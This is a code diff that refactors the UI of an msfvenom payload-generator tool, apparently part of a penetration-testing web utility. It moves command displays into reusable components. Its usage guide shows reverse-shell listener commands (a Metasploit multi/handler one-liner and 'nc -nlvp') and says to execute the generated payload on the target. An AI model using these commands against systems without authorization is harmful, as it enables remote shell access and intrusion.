@@ -4,6 +4,7 @@ import { useMemo, useState } from "react";
 import { Callout } from "@/components/ui/Callout";
 import { AuthorizedUseNotice } from "@/components/ui/AuthorizedUseNotice";
 import { CopyButton } from "@/components/ui/CopyButton";
+import { CommandBlock, InlineCommandRow } from "@/components/ui/CommandBlock";
 import { Tooltip } from "@/components/ui/Tooltip";
 import { iconButtonClasses, inputClasses, selectClasses, toggleButtonClasses } from "@/components/ui/formClasses";
 import { ArchId, MSFVENOM_ARCHS_BY_ID } from "@/lib/msfvenom/archs";
@@ -795,18 +796,17 @@ export function MsfvenomGeneratorTool() {
 
       {generatedSelection && generatedCommand && (
         <div className="flex flex-col gap-4">
-          <div>
-            <div className="mb-1 flex items-center justify-between">
-              <p className="text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Command</p>
-              <div className="flex gap-2">
+          <CommandBlock
+            label="Command"
+            command={generatedCommand}
+            actions={
+              <>
                 <CopyButton text={generatedCommand} label="Copy Command" />
                 {generatedBashVariable && <CopyButton text={generatedBashVariable} label="Copy as Bash Variable" />}
                 {generatedListenerParams && <CopyButton text={generatedListenerParams} label="Copy LHOST/LPORT" />}
-              </div>
-            </div>
-            <code className="block rounded border border-zinc-200 bg-white p-3 text-sm break-all whitespace-pre-wrap dark:border-zinc-800 dark:bg-zinc-900">
-              {generatedCommand}
-            </code>
+              </>
+            }
+          >
             <p className="mt-1 text-xs text-zinc-500 dark:text-zinc-400">
               {resolvePayloadId(generatedSelection.payload, generatedSelection.arch)} · {generatedSelection.format.label} ·{" "}
               {generatedSelection.encoder.label}
@@ -818,34 +818,17 @@ export function MsfvenomGeneratorTool() {
                 </Callout>
               </div>
             )}
-          </div>
+          </CommandBlock>
 
           <details className="rounded border border-zinc-200 dark:border-zinc-800" open>
             <summary className="cursor-pointer px-3 py-2 text-sm font-medium">Usage Guide</summary>
             <div className="flex flex-col gap-3 px-3 pb-3 text-sm text-zinc-600 dark:text-zinc-400">
               <p>Once you have your payload, catch it with a matching listener:</p>
-              <div>
-                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">Multi/handler (works for all Metasploit payloads)</p>
-                <div className="flex items-center justify-between gap-2">
-                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
-                    {`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
-                  </code>
-                  <CopyButton
-                    text={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
-                  />
-                </div>
-              </div>
-              <div>
-                <p className="mb-1 text-xs font-medium uppercase tracking-wide text-zinc-500 dark:text-zinc-400">
-                  Raw listener (plain, non-Meterpreter shell payloads only)
-                </p>
-                <div className="flex items-center justify-between gap-2">
-                  <code className="block flex-1 rounded border border-zinc-200 bg-white p-2 text-xs break-all dark:border-zinc-800 dark:bg-zinc-900">
-                    {`nc -nlvp ${guideLport}`}
-                  </code>
-                  <CopyButton text={`nc -nlvp ${guideLport}`} />
-                </div>
-              </div>
+              <InlineCommandRow
+                label="Multi/handler (works for all Metasploit payloads)"
+                command={`msfconsole -x "use exploit/multi/handler; set payload ${resolvePayloadId(generatedSelection.payload, generatedSelection.arch)}; set LHOST ${guideLhost}; set LPORT ${guideLport}; run"`}
+              />
+              <InlineCommandRow label="Raw listener (plain, non-Meterpreter shell payloads only)" command={`nc -nlvp ${guideLport}`} />
               <p>
                 Transfer the generated file to the target and execute it. If nothing connects back, check: the listener is running, LHOST is
                 reachable from the target (not 127.0.0.1), and firewall rules on both ends.
